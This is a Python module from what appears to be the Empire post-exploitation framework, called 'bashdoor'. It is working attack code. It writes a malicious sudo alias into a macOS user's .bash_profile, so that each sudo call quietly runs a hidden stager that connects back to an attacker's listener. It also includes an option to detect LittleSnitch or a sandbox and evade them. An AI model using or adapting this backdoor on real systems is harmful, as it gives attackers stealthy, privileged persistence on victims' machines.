class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'bashdoor',

            # list of one or more authors for the module
            'Author': ['@n00py'],

            # more verbose multi-line description of the module
            'Description': 'Creates an alias in the .bash_profile to cause the sudo command to execute a stager and pass through the origional command back to sudo',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required': True,
                'Value': 'True'
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=True, userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.replace('"', '\\"')
        script = '''
import os
from random import choice
from string import ascii_uppercase
home =  os.getenv("HOME")
randomStr = ''.join(choice(ascii_uppercase) for i in range(12))
bashlocation = home + "/Library/." + randomStr + ".sh"
with open(home + "/.bash_profile", "a") as profile:
    profile.write("alias sudo='sudo sh -c '\\\\''" + bashlocation + " & exec \\"$@\\"'\\\\'' sh'")
launcher = "%s"
stager = "#!/bin/bash\\n"
stager += launcher
with open(bashlocation, 'w') as f:
    f.write(stager)
    f.close()
os.chmod(bashlocation, 0755)
''' % (launcher)
        return script

